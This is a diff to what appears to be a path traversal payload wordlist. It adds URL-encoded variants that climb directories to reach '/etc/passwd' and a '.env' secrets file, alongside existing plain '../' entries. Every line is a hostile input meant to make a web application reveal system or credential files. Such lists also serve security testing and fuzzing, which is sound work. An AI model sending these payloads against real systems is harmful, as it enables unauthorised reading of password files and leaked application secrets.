@@ -1,4 +1,7 @@
 ../../../etc/passwd
+..%2f.env
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc/passwd
 ../../../../etc/passwd
 ../../../../../etc/passwd
 ../../../../../../../etc/passwd
